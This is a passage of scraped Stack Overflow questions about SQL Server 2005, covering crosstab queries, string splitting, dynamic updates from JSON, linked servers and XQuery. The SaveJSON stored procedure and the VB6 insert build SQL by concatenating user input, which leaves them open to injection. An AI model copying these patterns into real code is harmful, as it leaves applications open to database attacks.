-    **Are you**   -  01   -   Male\n01        -    **Areyou**    -  02    -  Female\n02        -    **From**     -   01   -   xxxxx\n02        -    **FROM**     -   02    -  yyyyy  \n---------------------------------------------------------------------\n</code></pre>\n\n<p>I want to get result shown in following table</p>\n\n<pre><code>-------------------------------------------------------------------------------\nUserID FirstName LastName  Mobile  **Areyou**   **From**\n-------------------------------------------------------------------------------\n001    -   xx     -  yy     -   03212  -  Male  -  yyyyy\n002    -   xxx    -  yyy    -   03425   - Female - xxxxx\n003    -   xxxx   -  yyyy   -   03429  -  Female -  xxxxx        \n</code></pre>\n"},{"tags":["sql","json","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":211,"score":0,"question_id":11945458,"title":"TSQL parse JSON string to update table. Please check and advise any bugs","body":"<p>Thanks to Phil Factor's parseJSON function first. \"Consuming JSON Strings in SQL Server\"</p>\n\n<pre><code>http://www.simple-talk.com/sql/t-sql-programming/consuming-json-strings-in-sql-server/\n</code></pre>\n\n<p>I have a simple json data which submitted from web form</p>\n\n<p>e.g. <code>{\"FName\":\"sss\",\"MName\":\"ddd\",\"Surname\":\"test\",\"Mdob\":\"1976-08-11\",\"Mage\":\"\",\"Country\":\"AU\",\"Postcode\":\"5000\"}</code></p>\n\n<p>By using parseJSON function in the SQL query, I got recordset as below</p>\n\n<pre><code>SELECT  ROW_NUMBER() OVER(ORDER BY element_id) AS RowNum, [NAME], stringvalue FROM dbo.parseJSON('{\"FName\":\"sss\",\"MName\":\"ddd\",\"Surname\":\"test\",\"Mdob\":\"1976-08-11\",\"Mage\":\"\",\"Country\":\"AU\",\"Postcode\":\"5000\"}') WHERE valuetype='string'\n</code></pre>\n\n<p>RESULT:  <a href=\"http://i.stack.imgur.com/qm9UW.jpg\" rel=\"nofollow\">http://i.stack.imgur.com/qm9UW.jpg</a></p>\n\n<p>I also have a table named as 'tblMother' which have around 50 columns, the json data may contain different columns data each time depends on what user submitted.</p>\n\n<p>so in my store procedure I query COLUMN_NAME, DATA_TYPE, character_maximum_length from information_schema.columns, and then use nested loop to compare json NAME with table columns name to build UPDATE sql query.</p>\n\n<p>LOOP in TSQL: <a href=\"http://i.stack.imgur.com/sJUC2.jpg\" rel=\"nofollow\">http://i.stack.imgur.com/sJUC2.jpg</a></p>\n\n<p>There are two temp tables #tmp_JSON and #tmp_TABLEDETAILS which store info from JSON and COLUMN_NAME, DATA_TYPE</p>\n\n<p><strong>Just wondering is this the right way to build update query?</strong> </p>\n\n<p>Thanks</p>\n\n<p><em><strong>The Full Stored Procedure I wrote:</em></strong></p>\n\n<pre><code>CREATE PROCEDURE [dbo].[SaveJSON]  \n    @MID nvarchar(12),\n    @TableName nvarchar(25),\n    @JSONData nvarchar(MAX)\nAS\nBEGIN\n    SET NOCOUNT ON;\n\n    DECLARE @CountJSON int,\n            @CountTbl int,\n            @RowNumJSON int,\n            @RowNumTbl int,\n            @CharLen nvarchar(4),\n            @strSQL nvarchar(MAX),\n            @jCOLname nvarchar(30),\n            @jCOLval nvarchar(255),\n            @tCOLname nvarchar(30),\n            @tCOLtyp nvarchar(255)\n\n    SET @strSQL = 'UPDATE ' + @TableName + ' SET '\n\n    -- INSERT ALL INFO INTO TWO TEMP TABLE\n    SELECT ROW_NUMBER() OVER(ORDER BY element_id) AS RowNum, [NAME], stringvalue INTO #tmp_JSON FROM dbo.parseJSON(@JSONData) WHERE valuetype='string';\n    SELECT  ROW_NUMBER() OVER(ORDER BY ORDINAL_POSITION) AS RowNum, COLUMN_NAME AS ColName, DATA_TYPE, character_maximum_length AS CharLen INTO #tmp_TABLEDETAILS FROM information_schema.columns WHERE table_name=@TableName;\n\n    SELECT @CountJSON = count([NAME]) FROM #tmp_JSON;\n    SELECT @CountTbl = count(ColName) FROM #tmp_TABLEDETAILS;\n\n\n    SET @RowNumJSON = 0 \n    SET @RowNumTbl = 0 \n\n    -- TWO NESTED LOOP TO BUILD UPDATE SQL STRING \n    WHILE @RowNumJSON &lt; @CountJSON\n    BEGIN\n        SET @RowNumJSON = @RowNumJSON + 1       \n        SET @RowNumTbl = 0\n\n        SELECT @jCOLname = [NAME], @jCOLval = stringvalue FROM #tmp_JSON WHERE RowNum = @RowNumJSON;\n\n\n            WHILE @RowNumTbl &lt; @CountTbl\n            BEGIN\n                SET @RowNumTbl = @RowNumTbl + 1\n\n                SELECT @tCOLname = ColName, @tCOLtyp = DATA_TYPE, @CharLen = CAST(CharLen AS nvarchar(4)) FROM #tmp_TABLEDETAILS WHERE RowNum = @RowNumTbl;\n\n                IF @jCOLname = @tCOLname AND NOT @CharLen IS NULL\n                BEGIN\n                    IF @jCOLval = ''\n                        SET @strSQL = @strSQL + @jCOLname + '=NULL, '\n                    ELSE\n                        SET @strSQL = @strSQL + @jCOLname + '=''' + @jCOLval + ''', '\n                END\n                IF @jCOLname = @tCOLname AND @CharLen IS NULL AND @tCOLtyp &lt;&gt; 'datetime'\n                    SET @strSQL = @strSQL + @jCOLname + '=' + @jCOLval + ', '\n                IF @jCOLname = @tCOLname AND @tCOLtyp = 'datetime'\n                    SET @strSQL = @strSQL + @jCOLname + '=CONVERT(DATETIME,''' + @jCOLval + ''', 102), '    \n            END\n\n    END\n\n    DROP TABLE #tmp_JSON\n    DROP TABLE #tmp_TABLEDETAILS\n\n    SET @strSQL = LEFT(@strSQL, LEN(@strSQL)-1)\n    SET @strSQL = @strSQL + ' WHERE MotherID = ''' + @MID + ''';'\n\n    PRINT @strSQL\n\nEND\n</code></pre>\n\n<p><strong>EXEC by</strong> </p>\n\n<pre><code>exec DBO.SaveJSON '10000000','tblMother','{\"FName\":\"sss\",\"MName\":\"ddd\",\"Surname\":\"test\",\"Mdob\":\"1976-08-11\",\"Mage\":\"\",\"Country\":\"AU\",\"Postcode\":\"5000\"}'\n</code></pre>\n\n<p><strong>Return @strSQL string is</strong> </p>\n\n<pre><code>UPDATE tblMother SET FName='sss', MName='ddd', Surname='test', Mdob=CONVERT(DATETIME,'1976-08-11', 102), Mage=NULL, Country='AU', Postcode=5000 WHERE MotherID = '10000000';\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":11977673,"title":"SQL Assembly Errors with Unsafe","body":"<p>I have the following error message:</p>\n\n<pre><code>Msg 10314, Level 16, State 11, Line 1\nAn error occurred in the Microsoft .NET Framework while trying to load assembly id 66007. The server may be running out of resources, or the assembly may not be trusted with PERMISSION_SET = EXTERNAL_ACCESS or UNSAFE. Run the query again, or check documentation to see how to solve the assembly trust issues. For more information about this error: \nSystem.IO.FileLoadException: Could not load file or assembly 'powerstatregression, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The given assembly name or codebase was invalid. (Exception from HRESULT: 0x80131047)\nSystem.IO.FileLoadException: \n    at System.Reflection.Assembly._nLoad(AssemblyName fileName, String codeBase, Evidence assemblySecurity, Assembly locationHint, StackCrawlMark&amp; stackMark, Boolean throwOnFileNotFound, Boolean forIntrospection)\n    at System.Reflection.Assembly.InternalLoad(AssemblyName assemblyRef, Evidence assemblySecurity, StackCrawlMark&amp; stackMark, Boolean forIntrospection)\n    at System.Reflection.Assembly.InternalLoad(String assemblyString, Evidence assemblySecurity, StackCrawlMark&amp; stackMark, Boolean forIntrospection)\n    at System.Reflection.Assembly.Load(String assemblyString)\n</code></pre>\n\n<p>I run this code and the last lines cause the problem:</p>\n\n<pre><code>ALTER DATABASE dasolPSDev SET TRUSTWORTHY ON;\nGO\n\nCREATE ASSEMBLY PowerStatRegression\nAUTHORIZATION [dbo]\nfrom 'C:\\SqlDlls\\PowerStatRegression.dll'\nWITH PERMISSION_SET = UNSAFE\nGO\n\nCREATE PROCEDURE [dbo].[SpCreatePowerStatCorr]\n    @strUID [nvarchar](4000),\n    @seqId [int],\n    @flagProgress [int]\nWITH EXECUTE AS CALLER\nAS\nEXTERNAL NAME [PowerStatRegression].[StoredProcedures].[SpCreatePowerStatCorr]\nGO\n\nCREATE PROCEDURE [dbo].[SpCreatePowerStatCorrEx]\n    @strUID [nvarchar](4000),\n    @seqId [int],\n    @flagProgress [int]\nWITH EXECUTE AS CALLER\nAS\nEXTERNAL NAME [PowerStatRegression].[StoredProcedures].[SpCreatePowerStatCorrEx]\nGO\n\n\nCREATE PROCEDURE [dbo].SpCheckCollinearity\n    @strUID [nvarchar](4000),\n    @seqId [int],\n    @flagProgress [int]\nWITH EXECUTE AS CALLER\nAS\nEXTERNAL NAME [PowerStatRegression].[StoredProcedures].[SpCheckCollinearity]\nGO\n\n\nCREATE PROCEDURE [dbo].[AboutPowerStatCorrelation]\nWITH EXECUTE AS CALLER\nAS\nEXTERNAL NAME [PowerStatRegression].[StoredProcedures].[AboutPowerStatCorrelation]\nGO\n\n--  To Test\ndbo.AboutPowerStatCorrelation\nGO\n\ngrant execute on SpCreatePowerStatCorr to db_executor\nGO\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":104,"score":2,"question_id":11972350,"title":"Crosstab multi columns","body":"<p>Hello I have a problem with SQL in SQL Server 2005.</p>\n\n<p>Suppose that I have a table called myTable with data as below:</p>\n\n<pre><code>|   NAME | CREDIT | GRADE | YEAR | SEMESTER |\n---------------------------------------------\n|  Name1 |      1 |     A |    1 |        1 |\n|  Name2 |      4 |     B |    1 |        1 |\n|  Name3 |      2 |     E |    1 |        1 |\n|  Name4 |      7 |     F |    1 |        1 |\n|  Name5 |      4 |     A |    1 |        2 |\n|  Name6 |      3 |     C |    1 |        2 |\n|  Name7 |      6 |     D |    1 |        2 |\n|  Name8 |      1 |     A |    1 |        2 |\n|  Name9 |      1 |     A |    1 |        2 |\n| Name10 |      1 |     A |    1 |        2 |\n| Name11 |      3 |     C |    2 |        1 |\n| Name12 |      6 |     E |    2 |        1 |\n| Name13 |      4 |     C |    2 |        1 |\n| Name14 |      2 |     B |    2 |        2 |\n| Name15 |      1 |     A |    2 |        2 |\n| Name16 |      1 |     A |    2 |        2 |\n| Name17 |      1 |     A |    2 |        2 |\n| Name18 |      5 |     D |    3 |        1 |\n| Name19 |      1 |     A |    3 |        1 |\n| Name20 |      1 |     A |    3 |        1 |\n| Name18 |      5 |     D |    3 |        2 |\n| Name19 |      1 |     A |    3 |        2 |\n| Name20 |      1 |     A |    3 |        2 |\n</code></pre>\n\n<p>I want to output the result as below:</p>\n\n<pre><code>|  NAM1 | CRDT1 | GRD1 | YEAR1 | SEMER1 | NAM2 | CRDT2 | GRD2 | YEAR2 | SEMES2 |\n   -----------------------------------------------------------------------------\n|  Name1|     1 |    A |     1 |      1 |Name5 |     4 |    A |     1 |      2 |\n|  Name2|     4 |    B |     1 |      1 |Name6 |     3 |    C |     1 |      2 |\n|  Name3|     2 |    E |     1 |      1 |Name7 |     6 |    D |     1 |      2 |\n|  Name4|     7 |    F |     1 |      1 |Name8 |     1 |    A |     1 |      2 |\n                                        |Name9 |     1 |    A |     1 |      2 |\n                                        |Name10|     1 |    A |     1 |      2 |\n| Name11|    3 |     C |     2 |      1 |Name14|     2 |    B |     2 |      2 |\n| Name12|    6 |     E |     2 |      1 |Name15|     1 |    A |     2 |      2 |\n| Name13|    4 |     C |     2 |      1 |Name16|     1 |    A |     2 |      2 |\n                                        |Name17|     1 |    A |     2 |      2 | \n| Name18|    5 |     D |     3 |      1 |Name18|     5 |    D |     3 |      2 |\n| Name19|    1 |     A |     3 |      1 |Name19|     1 |    A |     3 |      2 |\n| Name20|    1 |     A |     3 |      1 |Name20|     1 |    A |     3 |      2 |   \n</code></pre>\n\n<p>Where </p>\n\n<pre><code>- Nam1= Name in Semester 1\n- CRDT1= Credit in Semester 1\n- GRD1= Grade in Semester 1\n- Year1= Year in Semester 1 \n- Semer1 = Semester in Semester 1\n\n- Nam2= Name in Semester 2\n- CRDT2= Credit in Semester 2\n- GRD2= Grade in Semester 2\n- Year2= Year in Semester 2 \n- Semer2 = Semester in Semester 2\n</code></pre>\n\n<p>Please go to this URL to test this SQL: <a href=\"http://sqlfiddle.com/#!3/196c6/1\" rel=\"nofollow\">http://sqlfiddle.com/#!3/196c6/1</a> <br /><br />\nHow Can I create SQL to make output like this?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":9319,"score":6,"question_id":951401,"title":"SQL 2005 Split Comma Separated Column on Delimiter","body":"<p>My google searches on how to split a string on a delimiter have resulted in some useful functions for splitting strings when the string is known (i.e. see below):</p>\n\n<pre><code>SET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nALTER FUNCTION [dbo].[Split] (@String varchar(8000), @Delimiter char(1))     \n   returns @temptable TABLE (items varchar(8000))       \n   as       \n   begin       \n       declare @idx int       \n        declare @slice varchar(8000)       \n\n        select @idx = 1       \n            if len(@String)&lt;1 or @String is null  return       \n\n       while @idx!= 0       \n       begin       \n           set @idx = charindex(@Delimiter,@String)       \n           if @idx!=0       \n               set @slice = left(@String,@idx - 1)       \n           else       \n              set @slice = @String       \n\n           if(len(@slice)&gt;0)  \n               insert into @temptable(Items) values(@slice)       \n\n           set @String = right(@String,len(@String) - @idx)       \n           if len(@String) = 0 break       \n       end   \n   return       \n   end\n</code></pre>\n\n<p>This works well for a known string like:</p>\n\n<pre><code>SELECT TOP 10 * FROM dbo.Split('This,Is,My,List',',')\n</code></pre>\n\n<p>However, I would like to pass a column to a function, and have it unioned together with my other data in it's own row... for example given the data:</p>\n\n<pre><code>CommaColumn   ValueColumn1   ValueColumn2\n-----------   ------------   -------------\nABC,123       1              2\nXYZ, 789      2              3\n</code></pre>\n\n<p>I would like to write something like:</p>\n\n<pre><code>SELECT Split(CommaColumn,',') As SplitValue, ValueColumn1, ValueColumn2 FROM MyTable\n</code></pre>\n\n<p>And get back</p>\n\n<pre><code>SplitValue    ValueColumn1   ValueColumn2\n----------    ------------   ------------\nABC           1              2\n123           1              2\nXYZ           2              3\n789           2              3\n</code></pre>\n\n<p>Is this possible, or has anyone done this before?</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":11975063,"title":"Add Catalog to an Existing Linked Server","body":"<p>I have an existing Linked Server with a few catalogs... how can I add another, existing database/catalog to this linked server?</p>\n\n<p>For Example, my object explorer looks like this:</p>\n\n<p>Linked Servers</p>\n\n<ul>\n<li>Providers</li>\n<li>DB4\\PRODUCTION</li>\n<li>DB4_LINK\n<ul>\n<li>Catalogs\n<ul>\n<li>System Catalogs</li>\n<li>MyDatabase</li>\n<li>MyOtherDatabase</li>\n</ul></li>\n</ul></li>\n</ul>\n\n<p>How can I add yet another database that already exists to DB4_LINK?</p>\n\n<p>EDIT: I'm trying to add an <em>existing</em> database to this linked server entry.</p>\n"},{"tags":["sql","string","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":11974290,"title":"Dynamic String replacement in a list for SQL 2005","body":"<p>I have a column that can have results like the following:</p>\n\n<pre><code>ER\n\nER,ER,ER\n\nER,ER,OR,OR\n\nOR\n\nOR,OR\n\nOR,OR,OR,ER,ER\n</code></pre>\n\n<p>I am looking for a way to replace any a string such as <code>\"ER,ER,ER,OR,OR\"</code> to just <code>\"ER,OR\"</code>.  No matter how many times <code>ER</code> or <code>OR</code> show up I just want each displayed only once.  Thank you</p>\n"},{"tags":["sql-server-2005","vb6"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":545,"score":0,"question_id":11965241,"title":"Implicit conversion from data type varchar to varbinary(max) is not allowed. Use the CONVERT function to run this query","body":"<p>This is the code within my SAVE button in the form. I'm using VB6.0 and MSSQL Server 2005.  </p>\n\n<p>CommonDialog1 &amp; 2 holds the filename of the image inserted in the picture box.  </p>\n\n<pre class=\"lang-vb prettyprint-override\"><code>Set rs = con.Execute(\"insert into table1   \nvalues('\" &amp; txtbox1.Text &amp; \"' , \"_  \n&amp; \" '\" &amp; txtbox2.Text &amp; \"' , \"_     \n&amp; \" '\" &amp; CommonDialog1.FileName &amp; \"' , \"_    \n&amp; \" '\" &amp; CommonDialog2.FileName &amp; \"' , \"_  \n&amp; \" '\" &amp; txtbox3.Text &amp; \"' )\")\n</code></pre>\n\n<p>The <strong>\"Implicit conversion from data type varchar to varbinary(max) is not allowed. Use the CONVERT function to run this query.\"</strong> - error pops up during run-time.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":11956828,"title":"SQL Server union functionality?","body":"<p>I have a question regarding my attempt to combine two tables in sql server...</p>\n\n<p>I have one table that has about 30 columns (table a), and a second table that has about 5 (table b), those 5 being present in the 30 column table. I want to be able to add table b to the end of table a, and just use 0 values for the nonexistent columns in the new rows. </p>\n\n<p>Is there a way to do this? Obviously a regular union wouldnt work if I want to keep the other columns in table a.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":207,"score":1,"question_id":3148078,"title":"What is the SQL query to return the SQL error log configuration?","body":"<p>What is the SQL query to return the SQL error log configuration?</p>\n"},{"tags":["sql-server-2005","ssrs-2008","reportingservices-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":11971717,"title":"How can I list SSRS subscriptions that are invoked when an SSRS Snapshot completes?","body":"<p>I have searched various web sites and found an example on www.mssqltips.com that lists all subscriptions that have a shared schedule (tip prvided by  Scott Murray. It works well with SQL Server 2005 up to 2008 R2).</p>\n\n<p>We have a large number of subscriptions that are not fired via their own schedule, but when an SSRS snapshot job completes. The SSRS snapshot jobs are fired via their own SQL server Agent schedule, or manually.</p>\n\n<p>How can we identify the subscriptions that are trigerred in this way?</p>\n"},{"tags":["asp.net","sql","query","sql-server-2005"],"answer_count":4,"favorite_count":1,"up_vote_count":7,"down_vote_count":1,"view_count":169,"score":6,"question_id":11957445,"title":"Advice on SQL-Server Query","body":"<p>I'm looking to improve this query I wrote for a small web application in ASP.NET 4.0 using SQL-Server 2005. This application will allow the user to search by Product ID and have it return the following information:</p>\n\n<ul>\n<li>Highest Purchase Price + Most Recent Date of purchase @ this price</li>\n<li>Lowest Purchase Price + Most Recent Date of purchase @ this price</li>\n<li>Most Recent Purchase Price + Date</li>\n<li>Average Purchase Price (optional, i thought this might improve the usefulness of the app)</li>\n</ul>\n\n<p>Here is the structure of the Products table (I'm only including relevant columns, this is a DB already in production and these are non-pk columns)</p>\n\n<ul>\n<li>product_id (nvarchar(20))</li>\n<li>price (decimal(19,2))</li>\n<li>pDate (datetime)</li>\n</ul>\n\n<p>Before I put down the query I have so far I just want to say that I can get this information easily through multiple queries, so if this is the best practice then disregard improving the query, but I was aiming to minimize the number of queries needed to get all needed information.</p>\n\n<p>What I have so far: (Note: There are rows with price = 0 so I ignored those in the bottom select looking for the MIN price)</p>\n\n<pre><code>SELECT price, MAX(pDate)\nFROM Products\nWHERE product_id = @product_id AND\n     (price = (SELECT MAX(price)\n               FROM Products\n               WHERE product_id =@product_id) OR\n      price = (SELECT MIN(price)\n               FROM Products\n               WHERE product_id = @product_id AND price &gt; 0))\nGROUP BY price\n</code></pre>\n\n<p>Now this is returning 2 rows:</p>\n\n<ul>\n<li>first = the lowest price + date</li>\n<li>second row = high price + date</li>\n</ul>\n\n<p>What I would like ideally is to have a query return 1 row with all the needed information stated above if possible, as it would simplify displaying the information in ASP for me. And like I said earlier, if multiple queries is the be approach then no need to re-write a complex query here.</p>\n\n<p><em>Edit</em></p>\n\n<p>Here is some sample data</p>\n\n<p><img src=\"http://i.stack.imgur.com/9bFU8.png\" alt=\"Sample Data\"></p>\n\n<p>Desired query results: (ignore the format as I typed this in excel)</p>\n\n<p><img src=\"http://i.stack.imgur.com/z4seg.png\" alt=\"enter image description here\"></p>\n\n<p>Here is the query I will be using thanks to Ken Benson:</p>\n\n<pre><code>SELECT TOP 1 prod.product_id,\n   minp.price AS minprice, minp.pDate as minlastdate,\n   maxp.price AS maxprice, maxp.pDate as maxlastdate,\n   ag.price AS averageprice\nFROM products AS prod\nLEFT JOIN (SELECT lmd.product_id,max(lmd.pDate) as pDate,mn.price FROM products as lmd INNER JOIN \n           (SELECT product_id, min(price) AS price from products WHERE price &gt; 0 group by product_id) as mn ON lmd.product_id=mn.product_id AND lmd.price=mn.price\n                  group by lmd.product_id,mn.price ) AS minp ON minp.product_id=prod.product_id\nLEFT JOIN (SELECT lxd.product_id,max(lxd.pDate) as pDate,mx.price FROM products as lxd INNER JOIN \n           (SELECT product_id, max(price) AS price from products group by product_id) as mx ON lxd.product_id=mx.product_id AND lxd.price=mx.price\n              group by lxd.product_id,mx.price ) AS maxp ON maxp.product_id=prod.product_id\nLEFT JOIN (SELECT product_id,avg(price) as price FROM products WHERE price &gt; 0 GROUP BY product_id) AS ag ON ag.product_id=prod.product_id\nWHERE prod.product_id=@product_id\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":11965847,"title":"Crosstab/cross over query","body":"<p>Given data looks like</p>\n\n<pre><code>PLI_ID   OWN_ID   DCSF_ID   SCH_NAME          PREMIUM1 PREMIUM2  DESCRIPTION  \n901      2        1000     Dfe-School 1        86.40     7.20    Heads, Deps\n902      2        1000     Dfe-School 2        403.30    8.40    Relief Bursar\n903      2        1000     Dfe-School 3        327.00    8.40    £10.00 \n904      2        1000     Dfe-School 4        381.50    8.40    £11.00 \n905      2        1000     Dfe-School 5        152.60    8.40    Teaching staff\n</code></pre>\n\n<p>Expected data to look like</p>\n\n<pre><code>School          £10.00  £11.00  Heads, Deps  Relief Bursar  Teaching staff  Total\nDfe-School 1                            \nDfe-School 2                            \nDfe-School 3                            \nDfe-School 4                            \n\nTotal                                                                  [Pre-Total]\n</code></pre>\n\n<p>I am not sure whether to write a Cross Tab or Cross Over query, as suggested. Let me know, if need more explanation.</p>\n\n<p>My query uses around 6 tables and it looks like this: </p>\n\n<pre>\nSELECT PolicyLine.PLI_POS_Id, Policy.POL_OWN_Id, Policy.POL_DCSF, School.SCH_Name, PolicyLine.PLI_Premium, CoverPremium.CPR_Premium, StaffCategory.SCA_Description FROM\nSchool \nINNER JOIN Policy ON School.SCH_OWN_Id = Policy.POL_OWN_Id AND School.SCH_DCSF = Policy.POL_DCSF \nINNER JOIN PolicyLine ON Policy.POL_Id = PolicyLine.PLI_POL_Id \nINNER JOIN CoverOption ON PolicyLine.PLI_COP_Id = CoverOption.COP_Id \nINNER JOIN  CoverPremium ON CoverOption.COP_Id = CoverPremium.CPR_COP_Id AND Policy.POL_OWN_Id = CoverPremium.CPR_OWN_Id \nRIGHT OUTER JOIN StaffCategory ON CoverOption.COP_SCA_Id = StaffCategory.SCA_\n</pre>\n"},{"tags":["sql-server","sql-server-2005","security","sql-server-2008"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":2646,"score":1,"question_id":4081651,"title":"How to decode password from sys.syslogins table","body":"<p>I have a program in which the user needs to login with user name and password.\nI'm checking the name from the <code>sys.syslogins</code> table in master db.\nBut for the password I receive a string with (probably) coded characters like this (1?????????????).\nNow what can I do in order to decode that string and take the password in order to compare with the enter it one?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":5,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":3739,"score":6,"question_id":865162,"title":"Change Owner of Database Diagram in SQL Server 2005","body":"<p>I need to change the owner of a database diagram in SQL Server 2005. Currently it is owned by me (domain\\username.diagramName) and I would like to change it to be owned by dbo (dbo.diagramName). I thought I could use sp_changeobjectowner, but I believe that is only for tables, stored procedures, etc... I think this is pretty easy, I just haven't been able to find anything through a google search.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":11961398,"title":"How to ignore index in SQL Server","body":"<p>I found that one of the indexes is slowing my Query...but I can't drop it because it is used else where and it seems it is a good index for that query.</p>\n\n<p>Is there a way in SQL Server 2005+, where I could ignore an index in a Query?</p>\n"},{"tags":["sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":11956815,"title":"Extracting Elements using XQuery/SQL Server","body":"<p>I'm having zero success parsing the PartnerDescription elements from the /ShippingDocumentationNotification/ShippingBusinessDocument/ShipmentInformation/DeclarationInformation node in the XML extract below. My latest attempt:</p>\n\n<pre><code>SELECT  x.item.value('PartnerName[1]', 'VARCHAR(20)') AS PartnerName\nFROM    @Data.nodes('/ShippingDocumentationNotification/ShippingBusinessDocument/ShipmentInformation/DeclarationInformation/PartnerDescription/FullPartner/PartnerIdentification/PartnerName')\n        AS x ( item )\n</code></pre>\n\n<p>Where @Data is an XML variable that stores an instance of the XML extract. Ultimately I'd like to parse (i.e., flatten) data contained in the PartnerIdentification and PhysicalAddress subnodes of each PartnerDescription node.  I've looked all over google and SO - if someone could just get me started, I'd be much obliged.</p>\n\n<pre><code>&lt;tns:ShippingDocumentationNotification \n    xmlns:sha=\"urn:rosettanet:specification:domain:Shared:xsd:schema:01.17\" xmlns:dfpt=\"urn:rosettanet:specification:domain:Logistics:FreightPaymentTerms:xsd:codelist:01.03\" xmlns:uc=\"urn:rosettanet:specification:universal:Country:xsd:codelist:01.02\" xmlns:drl=\"urn:rosettanet:specification:domain:Logistics:RouteLocation:xsd:codelist:01.03\" xmlns:tns=\"urn:rosettanet:specification:interchange:ShippingDocumentationNotification:xsd:schema:02.07\" xmlns:dcst=\"urn:rosettanet:specification:domain:Logistics:CustomsType:xsd:codelist:01.03\" xmlns:dtrt=\"urn:rosettanet:specification:domain:Logistics:TrackingReferenceType:xsd:codelist:01.06\" xmlns:ssdh=\"urn:rosettanet:specification:system:StandardDocumentHeader:xsd:schema:01.23\" xmlns:uci=\"urn:rosettanet:specification:universal:ContactInformation:xsd:schema:01.04\" xmlns:updi=\"urn:rosettanet:specification:universal:ProductIdentification:xsd:schema:01.04\" xmlns:upi=\"urn:rosettanet:specification:universal:PartnerIdentification:xsd:schema:01.16\" xmlns:ucs=\"urn:rosettanet:specification:universal:CountrySubdivision:xsd:codelist:01.02\" xmlns:uuom=\"urn:rosettanet:specification:universal:UnitOfMeasure:xsd:codelist:01.04\" xmlns:ulc=\"urn:rosettanet:specification:universal:Locations:xsd:schema:01.04\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:upri=\"urn:rosettanet:specification:universal:ProcessRoleIdentifier:xsd:codelist:01.11\" xmlns:dsd=\"urn:rosettanet:specification:domain:Logistics:ShippingDocument:xsd:codelist:01.02\" xmlns:udct=\"urn:rosettanet:specification:universal:DocumentType:xsd:codelist:01.13\" xmlns:upd=\"urn:rosettanet:specification:universal:PhysicalDimension:xsd:schema:01.07\" xmlns:pfx24=\"http://www.tibco.com/xmlns/ae2xsd/2002/05/ae/ADB/OTMflex\" xmlns:udc=\"urn:rosettanet:specification:universal:Document:xsd:schema:01.12\" xmlns:rat=\"urn:rosettanet:specification:domain:Shared:AmountType:xsd:codelist:01.03\" xmlns:dat=\"urn:rosettanet:specification:domain:Procurement:ActionType:xsd:codelist:01.04\" xmlns=\"http://xyz/\" xmlns:dl=\"urn:rosettanet:specification:domain:Logistics:xsd:schema:02.22\" xmlns:dic=\"urn:rosettanet:specification:domain:Logistics:Incoterms:xsd:codelist:01.03\" xmlns:dsm=\"urn:rosettanet:specification:domain:Logistics:ShipmentMode:xsd:codelist:01.05\" xmlns:ume=\"urn:rosettanet:specification:universal:MonetaryExpression:xsd:schema:01.06\" xmlns:dpts=\"urn:rosettanet:specification:domain:Procurement:PaymentTerms:xsd:codelist:01.04\" xmlns:rssl=\"urn:rosettanet:specification:domain:Shared:ShippingServiceLevel:xsd:codelist:01.01\" xmlns:ucr=\"urn:rosettanet:specification:universal:Currency:xsd:codelist:01.03\" xmlns:dp=\"urn:rosettanet:specification:domain:Procurement:xsd:schema:02.28\" xmlns:dsh=\"urn:rosettanet:specification:domain:Procurement:SpecialHandling:xsd:codelist:01.04\"&gt;\n      &lt;ssdh:DocumentHeader&gt;\n        &lt;ssdh:DocumentInformation&gt;\n          &lt;ssdh:Creation&gt;2012-05-08T05:12:57-07:00&lt;/ssdh:Creation&gt;\n          &lt;ssdh:DocumentIdentification&gt;\n            &lt;ssdh:Identifier&gt;25163&lt;/ssdh:Identifier&gt;\n            &lt;ssdh:Type&gt;TRUCK CLOSE&lt;/ssdh:Type&gt;\n            &lt;ssdh:StandardDocumentIdentification&gt;\n              &lt;ssdh:Standard&gt;RosettaNet&lt;/ssdh:Standard&gt;\n              &lt;ssdh:Version&gt;11.11&lt;/ssdh:Version&gt;\n            &lt;/ssdh:StandardDocumentIdentification&gt;\n          &lt;/ssdh:DocumentIdentification&gt;\n        &lt;/ssdh:DocumentInformation&gt;\n        &lt;ssdh:Receiver&gt;\n          &lt;upi:PartnerIdentification&gt;\n            &lt;upi:PartnerName /&gt;\n            &lt;DUNS xmlns=\"urn:rosettanet:specification:universal:DataType:xsd:schema:01.04\"&gt;894694306&lt;/DUNS&gt;\n          &lt;/upi:PartnerIdentification&gt;\n        &lt;/ssdh:Receiver&gt;\n        